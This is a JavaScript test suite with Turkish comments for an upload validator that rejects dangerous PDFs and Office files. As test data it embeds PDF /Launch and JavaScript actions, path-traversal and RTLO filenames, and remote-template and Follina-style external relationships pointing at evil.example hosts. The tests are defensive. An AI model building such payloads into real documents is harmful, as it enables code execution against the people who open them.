// Belgeler (Faz 3b-A) dosya doğrulaması (DB'siz): imza tanıma, içerik denetimleri, dosya adı temizliği. Gerçek geçici dosyalar üzerinde çalışır.
import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { promises as fsp } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {
  ALLOWED_MIMES,
  KIND_INFO,
  assertHeadAcceptable,
  buildDisplayName,
  classifyDeclaredFile,
  detectRawKind,
  kindForExtension,
  sanitizeFileName,
  validateStoredFile,
} from '../src/modules/document_validation.js';
import { documentLimits } from '../src/modules/document_common.js';
import { EXE_BYTES, MACRO_CONTENT_TYPES, OLE_BYTES, makeDocx, makeJpeg, makePdf, makePng, makeXlsx, makeZip } from './fixtures/document_samples.js';

const limits = documentLimits({});
const noOffice = documentLimits({ DOCUMENTS_ALLOW_OFFICE: '0' });

let dir;
before(async () => {
  dir = await fsp.mkdtemp(path.join(os.tmpdir(), 'doc-validation-'));
});
after(async () => {
  await fsp.rm(dir, { recursive: true, force: true });
});

let counter = 0;
/** Tamponu diske yazar ve validateStoredFile sonucunu { kind } ya da { code } olarak döndürür. */
async function check(buffer, { expectedKind = 'pdf', declared = true, lim = limits } = {}) {
  const file = path.join(dir, `f${(counter += 1)}.bin`);
  await fsp.writeFile(file, buffer);
  const handle = await fsp.open(file, 'r');
  try {
    return { kind: await validateStoredFile(handle, buffer.length, { expectedKind, declared }, lim) };
  } catch (error) {
    return { code: error.code ?? String(error.message) };
  } finally {
    await handle.close();
  }
}

describe('imza tanıma', () => {
  it('PDF, JPEG, PNG, ZIP tanınır; OLE, MZ, HTML, SVG, metin, boş tanınmaz', () => {
    assert.equal(detectRawKind(makePdf()), 'pdf');
    assert.equal(detectRawKind(makeJpeg()), 'jpg');
    assert.equal(detectRawKind(makePng()), 'png');
    assert.equal(detectRawKind(makeDocx()), 'zip');
    for (const bytes of [OLE_BYTES, EXE_BYTES, Buffer.from('<html></html>'), Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"/>'), Buffer.from('merhaba'), Buffer.alloc(0), Buffer.from('%PDF')]) {
      assert.equal(detectRawKind(bytes), null);
    }
    assert.equal(detectRawKind('metin'), null);
  });

  it('kanonik tür tablosu: 5 MIME, uzantılar (jpeg/jpe jpg sayılır), makrolu / eski türler yok', () => {
    assert.equal(ALLOWED_MIMES.length, 5);
    assert.equal(kindForExtension('JPEG'), 'jpg');
    assert.equal(kindForExtension('jpe'), 'jpg');
    for (const ext of ['docm', 'xlsm', 'doc', 'xls', 'ppt', 'zip', 'rar', '7z', 'exe', 'dll', 'js', 'bat', 'sh', 'apk', 'html', 'htm', 'svg', 'xml', 'txt', 'csv', '']) {
      assert.equal(kindForExtension(ext), null, ext);
    }
    assert.equal(KIND_INFO.docx.mime, 'application/vnd.openxmlformats-officedocument.wordprocessingml.document');
    assert.equal(KIND_INFO.xlsx.mime, 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
  });

  it('erken karar: tanınmayan 415 DOCUMENT_TYPE_NOT_ALLOWED; bildirilen türle uyuşmayan 415 DOCUMENT_CONTENT_MISMATCH; adsız uzantıda uyuşma aranmaz', () => {
    const code = (head, options, lim = limits) => {
      try {
        return assertHeadAcceptable(head, options, lim);
      } catch (error) {
        return error.code;
      }
    };
    assert.equal(code(EXE_BYTES, { expectedKind: 'pdf', declared: true }), 'DOCUMENT_TYPE_NOT_ALLOWED');
    assert.equal(code(makePng().subarray(0, 16), { expectedKind: 'pdf', declared: true }), 'DOCUMENT_CONTENT_MISMATCH', 'pdf adlı PNG');
    assert.equal(code(makePng().subarray(0, 16), { expectedKind: 'pdf', declared: false }), 'png', 'uzantısız ad: tanınan tür kabul');
    assert.equal(code(makeDocx().subarray(0, 16), { expectedKind: 'pdf', declared: true }), 'DOCUMENT_CONTENT_MISMATCH');
    assert.equal(code(makeDocx().subarray(0, 16), { expectedKind: 'docx', declared: true }), 'zip');
    assert.equal(code(makeDocx().subarray(0, 16), { expectedKind: 'docx', declared: true }, noOffice), 'DOCUMENT_TYPE_NOT_ALLOWED', 'DOCUMENTS_ALLOW_OFFICE=0');
  });
});

describe('içerik doğrulaması (diskteki dosya)', () => {
  it('geçerli PDF / JPEG / PNG / DOCX / XLSX kabul edilir', async () => {
    assert.deepEqual(await check(makePdf()), { kind: 'pdf' });
    assert.deepEqual(await check(makeJpeg(), { expectedKind: 'jpg' }), { kind: 'jpg' });
    assert.deepEqual(await check(makePng(), { expectedKind: 'png' }), { kind: 'png' });
    assert.deepEqual(await check(makeDocx(), { expectedKind: 'docx' }), { kind: 'docx' });
    assert.deepEqual(await check(makeXlsx(), { expectedKind: 'xlsx' }), { kind: 'xlsx' });
    assert.deepEqual(await check(makeDocx({ method: 0 }), { expectedKind: 'docx' }), { kind: 'docx' }, 'saklanmış (stored) içerik türü girdisi de okunur');
  });

  it('kesik PDF (%%EOF yok) 415 DOCUMENT_CONTENT_MISMATCH; sonda %%EOF olan büyük PDF kabul', async () => {
    assert.deepEqual(await check(makePdf({ eof: false })), { code: 'DOCUMENT_CONTENT_MISMATCH' });
    assert.deepEqual(await check(makePdf({ padding: 3_000_000 })), { kind: 'pdf' });
  });

  it('PDF etkin içerik: /Launch, /JavaScript, /EmbeddedFile (ve #xx kaçışlı ad) reddedilir; zararsız PDF geçer', async () => {
    assert.deepEqual(await check(makePdf({ extra: '/OpenAction << /S /Launch /F (cmd.exe) >>' })), { code: 'DOCUMENT_ACTIVE_CONTENT' });
    assert.deepEqual(await check(makePdf({ extra: '/AA << /O << /S /JavaScript /JS (app.alert(1)) >> >>' })), { code: 'DOCUMENT_ACTIVE_CONTENT' });
    assert.deepEqual(await check(makePdf({ extra: '/Names << /EmbeddedFiles 3 0 R /EmbeddedFile 4 0 R >>' })), { code: 'DOCUMENT_ACTIVE_CONTENT' });
    assert.deepEqual(await check(makePdf({ extra: '/S /Java#53cript' })), { code: 'DOCUMENT_ACTIVE_CONTENT' }, '#xx ad kaçışı çözülerek taranır');
    assert.deepEqual(await check(makePdf({ extra: '/Title (JavaScript nedir?) /Producer (Launcher)' })), { kind: 'pdf' }, 'eğik çizgisiz sözcük etkin içerik değildir');
  });

  it('PDF taraması parça sınırında kaçırmaz (1 MiB örtüşmesi)', async () => {
    const head = Buffer.from('%PDF-1.4\n');
    const filler = Buffer.alloc(1048576 - head.length - 5, 0x20);
    const buffer = Buffer.concat([head, filler, Buffer.from('/Java'), Buffer.from('Script /JS ()\n%%EOF\n')]);
    assert.deepEqual(await check(buffer), { code: 'DOCUMENT_ACTIVE_CONTENT' });
  });

  it('PNG: IHDR + sonunda TAM IEND; sonuna veri eklenmişse (poliglot) ya da IEND yoksa reddedilir', async () => {
    assert.deepEqual(await check(makePng({ iend: false }), { expectedKind: 'png' }), { code: 'DOCUMENT_CONTENT_MISMATCH' });
    assert.deepEqual(await check(makePng({ trailing: Buffer.from('PK\x03\x04sonrasi', 'latin1') }), { expectedKind: 'png' }), { code: 'DOCUMENT_CONTENT_MISMATCH' });
    assert.deepEqual(await check(makePng().subarray(0, 20), { expectedKind: 'png' }), { code: 'DOCUMENT_CONTENT_MISMATCH' });
  });

  it('PNG adlı JPEG, PDF adlı PNG, DOCX adlı PDF: 415 DOCUMENT_CONTENT_MISMATCH; poliglot %PDF + MZ yine PDF kuralına tabidir', async () => {
    assert.deepEqual(await check(makeJpeg(), { expectedKind: 'png' }), { code: 'DOCUMENT_CONTENT_MISMATCH' });
    assert.deepEqual(await check(makePng(), { expectedKind: 'pdf' }), { code: 'DOCUMENT_CONTENT_MISMATCH' });
    assert.deepEqual(await check(makePdf(), { expectedKind: 'docx' }), { code: 'DOCUMENT_CONTENT_MISMATCH' });
    const polyglot = Buffer.concat([Buffer.from('%PDF-1.4\n'), EXE_BYTES, Buffer.from('\n%%EOF\n')]);
    assert.deepEqual(await check(polyglot), { kind: 'pdf' }, 'PDF imzası + geçerli kuyruk: etkin içerik adı yoksa PDF sayılır (güvenlik sınırı değildir; indirme HEP attachment+nosniff)');
  });

  it('OLE (.doc/.xls/.ppt), MZ (.exe), boş ve bozuk dosya 415 DOCUMENT_TYPE_NOT_ALLOWED', async () => {
    assert.deepEqual(await check(OLE_BYTES, { expectedKind: 'docx' }), { code: 'DOCUMENT_TYPE_NOT_ALLOWED' });
    assert.deepEqual(await check(EXE_BYTES), { code: 'DOCUMENT_TYPE_NOT_ALLOWED' });
    assert.deepEqual(await check(Buffer.alloc(0)), { code: 'DOCUMENT_TYPE_NOT_ALLOWED' });
    assert.deepEqual(await check(Buffer.from('PK\x03\x04', 'latin1'), { expectedKind: 'docx' }), { code: 'DOCUMENT_CONTENT_MISMATCH' }, 'EOCD yok');
  });

  it('OOXML: makro (vbaProject.bin), macroEnabled içerik türü, makro sayfası ve gömülü çalıştırılabilir 415 DOCUMENT_ACTIVE_CONTENT', async () => {
    assert.deepEqual(await check(makeDocx({ extra: [{ name: 'word/vbaProject.bin', data: 'x' }] }), { expectedKind: 'docx' }), { code: 'DOCUMENT_ACTIVE_CONTENT' });
    assert.deepEqual(await check(makeDocx({ contentTypes: MACRO_CONTENT_TYPES }), { expectedKind: 'docx' }), { code: 'DOCUMENT_ACTIVE_CONTENT' });
    assert.deepEqual(await check(makeDocx({ contentTypes: MACRO_CONTENT_TYPES, method: 0 }), { expectedKind: 'docx' }), { code: 'DOCUMENT_ACTIVE_CONTENT' });
    assert.deepEqual(await check(makeXlsx({ extra: [{ name: 'xl/macrosheets/sheet1.xml', data: '<m/>' }] }), { expectedKind: 'xlsx' }), { code: 'DOCUMENT_ACTIVE_CONTENT' });
    assert.deepEqual(await check(makeDocx({ extra: [{ name: 'word/embeddings/calc.exe', data: 'MZ' }] }), { expectedKind: 'docx' }), { code: 'DOCUMENT_ACTIVE_CONTENT' });
  });

  it('OOXML: şifreli girdi, `..`/mutlak/ters bölülü ad, yinelenen ad, çok girdi, [Content_Types].xml yok, DOCX/XLSX olmayan ZIP, ikisi birden reddedilir', async () => {
    const base = [{ name: '[Content_Types].xml', data: '<Types/>' }, { name: 'word/document.xml', data: '<d/>' }];
    assert.deepEqual(await check(makeZip([...base, { name: 'x.xml', data: 'a', flags: 0x801 }]), { expectedKind: 'docx' }), { code: 'DOCUMENT_CONTENT_MISMATCH' }, 'şifreli bayrak');
    for (const name of ['../evil.xml', '/etc/passwd', 'a\\b.xml', 'C:/x.xml', 'word/../../x']) {
      assert.deepEqual(await check(makeZip([...base, { name, data: 'a' }]), { expectedKind: 'docx' }), { code: 'DOCUMENT_CONTENT_MISMATCH' }, name);
    }
    assert.deepEqual(await check(makeZip([...base, { name: 'word/document.xml', data: 'b' }]), { expectedKind: 'docx' }), { code: 'DOCUMENT_CONTENT_MISMATCH' }, 'yinelenen ad');
    const many = Array.from({ length: 5001 }, (_, i) => ({ name: `p/${i}.xml`, data: '' }));
    assert.deepEqual(await check(makeZip([...base, ...many]), { expectedKind: 'docx' }), { code: 'DOCUMENT_CONTENT_MISMATCH' }, '> 5000 girdi');
    assert.deepEqual(await check(makeZip([{ name: 'word/document.xml', data: '<d/>' }]), { expectedKind: 'docx' }), { code: 'DOCUMENT_CONTENT_MISMATCH' }, '[Content_Types].xml yok');
    assert.deepEqual(await check(makeZip([{ name: '[Content_Types].xml', data: '<Types/>' }, { name: 'ppt/presentation.xml', data: '<p/>' }]), { expectedKind: 'docx', declared: false }), { code: 'DOCUMENT_TYPE_NOT_ALLOWED' }, 'pptx / düz arşiv');
    assert.deepEqual(await check(makeZip([...base, { name: 'xl/workbook.xml', data: '<w/>' }]), { expectedKind: 'docx' }), { code: 'DOCUMENT_CONTENT_MISMATCH' }, 'ikisi birden');
  });

  it('ZIP bombası bildirimi: bildirilen açılmış toplam 1 GiB üstüyse dosya AÇILMADAN reddedilir; xlsx adlı docx uyuşmaz', async () => {
    const bomb = makeZip([
      { name: '[Content_Types].xml', data: '<Types/>' },
      { name: 'word/document.xml', data: '<d/>', declaredUncompressed: 2 ** 31 },
    ]);
    assert.deepEqual(await check(bomb, { expectedKind: 'docx' }), { code: 'DOCUMENT_CONTENT_MISMATCH' });
    assert.deepEqual(await check(makeDocx(), { expectedKind: 'xlsx' }), { code: 'DOCUMENT_CONTENT_MISMATCH' });
    assert.deepEqual(await check(makeDocx(), { expectedKind: 'docx', lim: noOffice }), { code: 'DOCUMENT_TYPE_NOT_ALLOWED' });
  });

  it('EOCD yorumu uzunluğu dosya sonuna ulaşmıyorsa (sonuna eklenmiş veri) reddedilir', async () => {
    const zip = Buffer.concat([makeDocx(), Buffer.from('EK-VERI')]);
    assert.deepEqual(await check(zip, { expectedKind: 'docx' }), { code: 'DOCUMENT_CONTENT_MISMATCH' });
  });
});

describe('dosya adı temizliği (yalnız görünen ad; yola girmez)', () => {
  const clean = (name) => sanitizeFileName(name);

  it('yol parçaları atılır: ../../etc/passwd -> passwd; ..\\..\\x -> x; C:\\a\\b.pdf -> b', () => {
    assert.deepEqual(clean('../../etc/passwd'), { base: 'passwd', ext: '' });
    assert.deepEqual(clean('..\\..\\x'), { base: 'x', ext: '' });
    assert.deepEqual(clean('C:\\a\\b.pdf'), { base: 'b', ext: 'pdf' });
    assert.deepEqual(clean('/etc/hosts'), { base: 'hosts', ext: '' });
  });

  it('NUL ve kontrol karakterleri atılır; RTLO hilesi (gpj.exe) çözülür: uzantı exe kalır', () => {
    assert.equal(clean('a\0b.pdf').base, 'ab');
    assert.deepEqual(clean(String.fromCodePoint(0x202e) + 'gpj.exe'), { base: 'gpj', ext: 'exe' });
    assert.deepEqual(clean('rapor' + String.fromCodePoint(0x200b) + '.pdf'), { base: 'rapor', ext: 'pdf' });
    assert.equal(clean('a\tb\nc.pdf').base, 'a b c');
  });

  it('çift uzantı: a.pdf.exe -> taban a_pdf, uzantı exe; kalan noktalar _ olur', () => {
    assert.deepEqual(clean('a.pdf.exe'), { base: 'a_pdf', ext: 'exe' });
    assert.deepEqual(clean('v1.2.final.pdf'), { base: 'v1_2_final', ext: 'pdf' });
  });

  it('Windows ayrılmış adlar _ önekini alır; yasak karakterler _ olur; baş/son boşluk ve son nokta atılır', () => {
    assert.deepEqual(clean('CON.pdf'), { base: '_CON', ext: 'pdf' });
    assert.deepEqual(clean('nul'), { base: '_nul', ext: '' });
    assert.deepEqual(clean('LPT3.png'), { base: '_LPT3', ext: 'png' });
    assert.equal(clean('a<b>c:d"e|f?g*h.pdf').base, 'a_b_c_d_e_f_g_h');
    assert.deepEqual(clean('  rapor  .pdf. . '), { base: 'rapor', ext: 'pdf' });
  });

  it('çok uzun ad 100 kod noktasına iner; emoji ve Türkçe karakterler korunur; boş ad belge olur', () => {
    assert.equal(Array.from(clean('x'.repeat(500) + '.pdf').base).length, 100);
    assert.deepEqual(clean('Toplantı Tutanağı İşçi 😀.pdf'), { base: 'Toplantı Tutanağı İşçi 😀', ext: 'pdf' });
    assert.deepEqual(clean(''), { base: 'belge', ext: '' });
    assert.deepEqual(clean('...'), { base: 'belge', ext: '' });
    assert.deepEqual(clean('.pdf'), { base: 'belge', ext: 'pdf' });
    assert.deepEqual(clean(null), { base: 'belge', ext: '' });
  });

  it('görünen ad = taban + kanonik uzantı (en çok 120 karakter)', () => {
    assert.equal(buildDisplayName('rapor', 'pdf'), 'rapor.pdf');
    assert.equal(buildDisplayName('rapor', ''), 'rapor');
    assert.ok(Array.from(buildDisplayName('x'.repeat(100), 'docx')).length <= 120);
  });

  it('bildirim sınıflama: izinli uzantı kanonikleşir (jpeg -> jpg); izinsiz uzantı 415; uzantısız ad kabul; Office kapalıysa docx 415', () => {
    const pick = (name, contentType = null, lim = limits) => {
      try {
        return classifyDeclaredFile({ name, contentType }, lim);
      } catch (error) {
        return { code: error.code };
      }
    };
    assert.equal(pick('Foto.JPEG').displayName, 'Foto.jpg');
    assert.equal(pick('Foto.JPEG').mimeType, 'image/jpeg');
    assert.equal(pick('rapor.exe').code, 'DOCUMENT_TYPE_NOT_ALLOWED');
    assert.equal(pick('rapor.docm').code, 'DOCUMENT_TYPE_NOT_ALLOWED');
    assert.equal(pick('a.pdf.exe').code, 'DOCUMENT_TYPE_NOT_ALLOWED');
    assert.equal(pick('betik.html').code, 'DOCUMENT_TYPE_NOT_ALLOWED');
    const bare = pick('tutanak');
    assert.equal(bare.declared, false);
    assert.equal(bare.displayName, 'tutanak');
    assert.equal(pick('tutanak', 'image/png').mimeType, 'image/png', 'Content-Type yalnız geçici ipucu');
    assert.equal(pick('sozlesme.docx', null, noOffice).code, 'DOCUMENT_TYPE_NOT_ALLOWED');
    assert.equal(pick('sozlesme.docx').declared, true);
  });
});

describe('R9 F5: PDF etkin içerik adları (genişletilmiş liste; en iyi çaba)', () => {
  const REJECTED = [
    ['/EF', '/FS << /Type /Filespec /EF << /F 5 0 R >> >>'],
    ['/EmbeddedFiles', '/Names << /EmbeddedFiles 3 0 R >>'],
    ['/GoToE', '/A << /S /GoToE /T << /R /C >> >>'],
    ['/GoToR', '/A << /S /GoToR /F (baska.pdf) /D [0 /Fit] >>'],
    ['/RichMedia', '/Subtype /RichMedia /RichMediaContent 9 0 R'],
    ['/XFA', '/AcroForm << /XFA [ (template) 12 0 R ] >>'],
    ['/SubmitForm', '/A << /S /SubmitForm /F (http://x.example/) >>'],
    ['/ImportData', '/A << /S /ImportData /F (veri.fdf) >>'],
    ['/JS', '/A << /S /JavaScript /JS (this.print()) >>'],
  ];

  it('her yeni ad tek başına reddedilir (DOCUMENT_ACTIVE_CONTENT)', async () => {
    for (const [label, extra] of REJECTED) {
      assert.deepEqual(await check(makePdf({ extra })), { code: 'DOCUMENT_ACTIVE_CONTENT' }, label);
    }
  });

  it('#xx ad kaçışıyla gizlenen yeni adlar da yakalanır (/Rich#4Dedia, /Submit#46orm, /G#6FToR)', async () => {
    for (const extra of ['/Subtype /Rich#4Dedia', '/S /Submit#46orm', '/S /G#6FToR']) {
      assert.deepEqual(await check(makePdf({ extra })), { code: 'DOCUMENT_ACTIVE_CONTENT' }, extra);
    }
  });

  it('ad sınırı: /EFFECTS, /EFx, /JSON, /XFAx, /GoToRx, /SubmitFormat ve eğik çizgisiz sözcükler MEŞRU PDF\'i bozmaz', async () => {
    const extra = '/Type /Font /BaseFont /Helvetica /EFFECTS 1 /EFx 2 /JSON 3 /XFAx 4 /GoToRx 5 /SubmitFormat 6 /Title (EF JS XFA GoToR RichMedia)';
    assert.deepEqual(await check(makePdf({ extra })), { kind: 'pdf' });
  });

  it('/URI BİLEREK reddedilmez: sıradan web / e-posta bağlantıları (Word, LibreOffice dışa aktarımı) geçer', async () => {
    const extra = '/Subtype /Link /A << /S /URI /URI (https://www.example.com/yonetmelik) >> /A << /S /URI /URI (mailto:yonetim@example.com) >>';
    assert.deepEqual(await check(makePdf({ extra })), { kind: 'pdf' });
  });
});

describe('R9 F6: OOXML gömülü etkin içerik (embeddings/, activeX/, uzak şablon)', () => {
  const docx = (extra, opts = {}) => check(makeDocx({ extra }), { expectedKind: 'docx', ...opts });
  const xlsx = (extra) => check(makeXlsx({ extra }), { expectedKind: 'xlsx' });
  const ACTIVE = { code: 'DOCUMENT_ACTIVE_CONTENT' };

  it('embeddings/ altındaki .bin / .xlsm / .docm / OLE (.xls .doc .ppt) girdileri reddedilir; ad büyük küçük harfe ve alt dizine bakmaz', async () => {
    for (const name of [
      'word/embeddings/oleObject1.bin',
      'word/embeddings/Microsoft_Excel_Macro.xlsm',
      'word/embeddings/Document1.docm',
      'word/embeddings/eski.xls',
      'word/embeddings/eski.DOC',
      'word/embeddings/eski.ppt',
      'word/embeddings/alt/klasor/paket.bin',
      'embeddings/oleObject2.BIN',
    ]) {
      assert.deepEqual(await docx([{ name, data: 'x' }]), ACTIVE, name);
    }
    assert.deepEqual(await xlsx([{ name: 'xl/embeddings/oleObject1.bin', data: 'x' }]), ACTIVE);
  });

  it('activeX/ altındaki her girdi (activeX1.xml, activeX1.bin) reddedilir', async () => {
    assert.deepEqual(await docx([{ name: 'word/activeX/activeX1.xml', data: '<ax/>' }]), ACTIVE);
    assert.deepEqual(await docx([{ name: 'word/activeX/activeX1.bin', data: 'x' }]), ACTIVE);
    assert.deepEqual(await xlsx([{ name: 'xl/activeX/activeX1.xml', data: '<ax/>' }]), ACTIVE);
  });

  it('MEŞRU girdiler geçer: xl/printerSettings/*.bin, embeddings/ altında modern .xlsx ve resim, "activeXdemo" gibi benzer adlar', async () => {
    assert.deepEqual(await xlsx([{ name: 'xl/printerSettings/printerSettings1.bin', data: 'yazici' }]), { kind: 'xlsx' });
    assert.deepEqual(await docx([{ name: 'word/printerSettings/printerSettings1.bin', data: 'yazici' }]), { kind: 'docx' });
    assert.deepEqual(await docx([{ name: 'word/embeddings/Microsoft_Excel_Sheet1.xlsx', data: 'PK' }]), { kind: 'docx' });
    assert.deepEqual(await docx([{ name: 'word/embeddings/resim.png', data: 'x' }]), { kind: 'docx' });
    assert.deepEqual(await docx([{ name: 'word/media/activeXdemo.png', data: 'x' }]), { kind: 'docx' });
  });

  const rels = (relationship) =>
    `<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${relationship}</Relationships>`;
  const TEMPLATE = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate';

  it('settings.xml.rels: attachedTemplate + TargetMode="External" (öznitelik sırası, tırnak türü, sıkıştırma fark etmez) reddedilir', async () => {
    const variants = [
      `<Relationship Id="rId1" Type="${TEMPLATE}" Target="http://saldirgan.example/sablon.dotm" TargetMode="External"/>`,
      `<Relationship Id="rId1" Target="http://saldirgan.example/sablon.dotm" TargetMode="External" Type="${TEMPLATE}"/>`,
      `<Relationship Id='rId1' Type='${TEMPLATE}' Target='file:///\\\\saldirgan\\paylasim\\sablon.dotm' TargetMode = 'External'/>`,
    ];
    for (const method of [0, 8]) {
      for (const relationship of variants) {
        assert.deepEqual(
          await docx([{ name: 'word/_rels/settings.xml.rels', data: rels(relationship), method }]),
          ACTIVE,
          `method=${method} ${relationship.slice(0, 50)}`,
        );
      }
    }
  });

  it('settings.xml.rels: iç şablon (External yok), başka ilişki türü (hyperlink External) ve ilişkisiz dosya GEÇER', async () => {
    const internal = rels(`<Relationship Id="rId1" Type="${TEMPLATE}" Target="sablon.dotx"/>`);
    const hyperlink = rels('<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com/" TargetMode="External"/>');
    for (const data of [internal, hyperlink, rels('')]) {
      assert.deepEqual(await docx([{ name: 'word/_rels/settings.xml.rels', data }]), { kind: 'docx' });
    }
  });

  it('.rels girdileri sınırlı okunur: bildirilen boyut 4 MiB üstüyse, ya da bildirilen küçük ama gerçek açılım büyükse (sahte boyut) 415 DOCUMENT_CONTENT_MISMATCH', async () => {
    const big = Buffer.alloc(5 * 1024 * 1024, 0x20);
    assert.deepEqual(
      await docx([{ name: 'word/_rels/settings.xml.rels', data: big, method: 8 }]),
      { code: 'DOCUMENT_CONTENT_MISMATCH' },
      'dürüst büyük girdi: açılmadan reddedilir',
    );
    assert.deepEqual(
      await docx([{ name: 'word/_rels/settings.xml.rels', data: big, method: 8, declaredUncompressed: 100 }]),
      { code: 'DOCUMENT_CONTENT_MISMATCH' },
      'sahte küçük boyut: sınırlı açım (maxOutputLength) taşar',
    );
  });
});

describe('R16 P2-1: OOXML etkin içerik İÇERİĞE göre denetlenir (ad kalıbı atlatmaları B1-B8)', () => {
  const ACTIVE = { code: 'DOCUMENT_ACTIVE_CONTENT' };
  const WORD_MAIN = 'application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml';
  const REL = (name) => `http://schemas.openxmlformats.org/officeDocument/2006/relationships/${name}`;
  const types = (main = WORD_MAIN, extra = '') =>
    `<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="${main}"/>${extra}</Types>`;
  const rels = (inner) => `<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${inner}</Relationships>`;
  const utf16le = (text) => Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(text.replace('UTF-8', 'UTF-16'), 'utf16le')]);
  const utf16be = (text) => Buffer.concat([Buffer.from([0xfe, 0xff]), Buffer.from(text.replace('UTF-8', 'UTF-16'), 'utf16le').swap16()]);
  const bomUtf8 = (text) => Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from(text, 'utf8')]);
  const doc = (entries, contentTypes = types()) =>
    makeZip([{ name: '[Content_Types].xml', data: contentTypes, method: 8 }, { name: 'word/document.xml', data: '<w:document/>' }, ...entries]);
  const relEntry = (name, inner) => ({ name, data: rels(inner), method: 8 });
  const accepted = async (buffer, expectedKind = 'docx') => (await check(buffer, { expectedKind })).kind;
  async function rejection(buffer, expectedKind = 'docx') {
    const file = path.join(dir, `r${(counter += 1)}.bin`);
    await fsp.writeFile(file, buffer);
    const handle = await fsp.open(file, 'r');
    try {
      await validateStoredFile(handle, buffer.length, { expectedKind, declared: true }, limits);
      return null;
    } catch (error) {
      return { code: error.code, message: error.message, reason: error.extra?.reason };
    } finally {
      await handle.close();
    }
  }
  const TEMPLATE = REL('attachedTemplate');
  const remote = (type, target = 'http://evil.example/x') => `<Relationship Id="rId1" Type="${type}" Target="${target}" TargetMode="External"/>`;

  it('kontrol örnekleri (K1-K4) reddedilir', async () => {
    assert.deepEqual(await check(doc([relEntry('word/_rels/settings.xml.rels', remote(TEMPLATE))]), { expectedKind: 'docx' }), ACTIVE, 'K1');
    assert.deepEqual(await check(doc([], types('application/vnd.ms-word.document.macroEnabled.main+xml')), { expectedKind: 'docx' }), ACTIVE, 'K2');
    assert.deepEqual(await check(doc([{ name: 'word/embeddings/oleObject1.bin', data: Buffer.alloc(64, 1) }]), { expectedKind: 'docx' }), ACTIVE, 'K3');
    assert.deepEqual(await check(doc([{ name: 'word/activeX/activeX1.bin', data: Buffer.alloc(64, 1) }]), { expectedKind: 'docx' }), ACTIVE, 'K4');
  });

  it('B1: ayar parçası FARKLI adla (word/_rels/s2.xml.rels): TÜM *.rels taranır, yalnız settings.xml.rels değil', async () => {
    const buffer = doc([
      relEntry('word/_rels/document.xml.rels', `<Relationship Id="rId9" Type="${REL('settings')}" Target="s2.xml"/>`),
      { name: 'word/s2.xml', data: '<w:settings/>' },
      relEntry('word/_rels/s2.xml.rels', remote(TEMPLATE)),
    ]);
    const verdict = await rejection(buffer);
    assert.deepEqual([verdict.code, verdict.reason], ['DOCUMENT_ACTIVE_CONTENT', 'external']);
  });

  it('B2: TargetMode="&#69;xternal" (karakter başvurusu) ve ad alanı önekli etiket / tek tırnak / > içeren öznitelik açılarak denetlenir', async () => {
    const entry = (inner) => [relEntry('word/_rels/settings.xml.rels', inner)];
    assert.deepEqual(await check(doc(entry(`<Relationship Id="rId1" Type="${TEMPLATE}" Target="http://evil.example/t.dotm" TargetMode="&#69;xternal"/>`)), { expectedKind: 'docx' }), ACTIVE);
    assert.deepEqual(await check(doc(entry(`<Relationship Id="rId1" Type="${TEMPLATE}" Target="http://evil.example/t.dotm" TargetMode="&#x45;&#x58;ternal"/>`)), { expectedKind: 'docx' }), ACTIVE);
    assert.deepEqual(await check(doc(entry(`<Relationship Id='rId1' Type='${TEMPLATE}' Target='http://evil.example/t.dotm' TargetMode='External'/>`)), { expectedKind: 'docx' }), ACTIVE);
    assert.deepEqual(await check(doc(entry(`<pr:Relationship xmlns:pr="http://schemas.openxmlformats.org/package/2006/relationships" Id="rId1" Type="${TEMPLATE}" Target="http://evil.example/t.dotm" TargetMode="External"/>`)), { expectedKind: 'docx' }), ACTIVE);
    assert.deepEqual(await check(doc(entry(`<Relationship Id="a>b" Type="${TEMPLATE}" Target="http://evil.example/t.dotm" TargetMode="External"/>`)), { expectedKind: 'docx' }), ACTIVE, '> içeren öznitelik değeri etiketi bitirmez');
    assert.deepEqual(await check(doc(entry(`<Relationship Id="rId1" Type="${TEMPLATE.replace('attachedTemplate', 'attached&#84;emplate')}" Target="http://evil.example/t.dotm" TargetMode="External"/>`)), { expectedKind: 'docx' }), ACTIVE, 'Type da karakter başvurusuyla gizlenemez');
  });

  it('B3: *.rels UTF-16LE / UTF-16BE / BOM\'lu UTF-8 / BOM\'suz UTF-16 kodlu bile olsa çözülerek denetlenir', async () => {
    const body = rels(remote(TEMPLATE));
    for (const [label, data] of [
      ['utf16le+BOM', utf16le(body)],
      ['utf16be+BOM', utf16be(body)],
      ['utf8+BOM', bomUtf8(body)],
      ['utf16le BOM yok', Buffer.from(body.replace('UTF-8', 'UTF-16'), 'utf16le')],
      ['utf16be BOM yok', Buffer.from(body.replace('UTF-8', 'UTF-16'), 'utf16le').swap16()],
    ]) {
      assert.deepEqual(await check(doc([{ name: 'word/_rels/settings.xml.rels', data, method: 8 }]), { expectedKind: 'docx' }), ACTIVE, label);
    }
  });

  it('B4: document.xml.rels dış oleObject (CVE-2017-0199 / Follina kalıbı) reddedilir; DIŞ subDocument / frame / externalLink de', async () => {
    for (const type of ['oleObject', 'subDocument', 'frame', 'externalLink']) {
      const target = type === 'oleObject' ? 'http://evil.example/x.html!' : 'http://evil.example/x';
      assert.deepEqual(await check(doc([relEntry('word/_rels/document.xml.rels', remote(REL(type), target))]), { expectedKind: 'docx' }), ACTIVE, type);
    }
    assert.deepEqual(await check(doc([relEntry('word/_rels/document.xml.rels', remote('http://schemas.microsoft.com/office/2006/relationships/oleObject', 'ms-msdt:/id'))]), { expectedKind: 'docx' }), ACTIVE, 'ms-msdt hedefli');
  });

